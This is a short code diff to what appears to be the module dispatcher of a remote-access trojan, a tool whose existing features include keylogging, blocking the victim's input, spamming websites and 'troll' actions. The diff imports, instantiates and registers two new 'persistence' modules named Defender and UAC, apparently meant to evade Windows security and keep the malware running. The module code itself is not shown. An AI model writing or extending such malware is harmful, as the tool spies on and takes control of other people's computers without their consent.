@@ -23,6 +23,8 @@ from .modules.input_output.block_input import BlockInput
 from .modules.surveillance.keylog import Keylog
 from .modules.troll.cd import Cd
 from .modules.troll.website_spam import WebsiteSpam
+from .modules.persistence.defender import Defender
+from .modules.persistence.uac import UAC
 
 filesystem_handler = FileSystem()
 download = Download()
@@ -48,6 +50,8 @@ cd = Cd()
 type_message = TypeMessage(BlockInput())
 website_spam = WebsiteSpam(BlockInput())
 window_troll = WindowTroll()
+defender = Defender()
+uac = UAC()
 
 def module_factory(module_name: str) -> ICommandModule:
     module_name_map = {
@@ -74,7 +78,9 @@ def module_factory(module_name: str) -> ICommandModule:
         "cd" : cd,
         "type_message" : type_message,
         "website_spam" : website_spam,
-        "window_troll": window_troll
+        "window_troll": window_troll,
+        "defender" : defender,
+        "uac" : uac
     }
     if module_name not in module_name_map:
         raise ValueError("Module Not found")
